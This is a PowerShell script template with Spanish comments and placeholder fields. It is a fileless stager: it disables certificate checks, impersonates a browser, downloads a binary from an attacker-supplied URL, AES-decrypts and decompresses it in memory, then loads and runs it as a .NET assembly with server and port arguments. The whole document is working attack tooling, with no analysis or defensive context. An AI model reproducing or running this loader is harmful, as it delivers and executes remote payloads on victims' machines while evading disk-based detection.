[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$wc = New-Object -TypeName System.Net.WebClient

$wc.Headers.Add(“Accept-Language”, “en-US,en;q=0.” + ([IntPtr]::Size – 1).ToString())

$wc.Headers.Add(“User-Agent”, “Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)”)

$rndn = Get-Random

$wc.Headers.Add(“Cookie”, “p=” + $rndn)

$data = $wc.DownloadData(“[URL AL PROGRAMA]”)

#PARAMETROS PARA EJECUTAR (OPCIONAL)
[string[]]$xags = “/s”, “[SERVER]”, “/p”, “[PORT]”

#INICIO DE PROCESO DE DESCIFRADO (OPCIONAL)
$Passphrase = “[CLAVE CIFRADO]”

$salts = “[SALT]”

$r = new-Object System.Security.Cryptography.RijndaelManaged

$pass = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)

$salt = [System.Text.Encoding]::UTF8.GetBytes($salts)

 

$r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, “SHA1″, 5).GetBytes(32) #256/8

$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($rndn) )[0..15]

 

$d = $r.CreateDecryptor()

$ms = new-Object IO.MemoryStream @(,$data)

$cs = new-Object Security.Cryptography.CryptoStream $ms,$d,”Read”
#FIN DE PROCESO DE DESCIFRADO (OPCIONAL)

#DESCOMPRESION (OPCIONAL)
$dfs = New-Object System.IO.Compression.GzipStream $cs, ([IO.Compression.CompressionMode]::Decompress)

$msout = New-Object System.IO.MemoryStream

[byte[]]$buffer = new-object byte[] 4096

[int]$count = 0

do

{

$count = $dfs.Read($buffer, 0, $buffer.Length)

$msout.Write($buffer, 0, $count)

} while ($count -gt 0)

 

$dfs.Close()

$cs.Close()

$ms.Close()

$r.Clear()

 

[byte[]]$bin = $msout.ToArray()

$al = New-Object -TypeName System.Collections.ArrayList

#AGREGAR PARAMETROS AL EJECUTABLE (OPCIONAL)
$al.Add($xags) 

$asm = [System.Reflection.Assembly]::Load($bin)

$asm.EntryPoint.Invoke($null, $al.ToArray())

sleep 5

Exit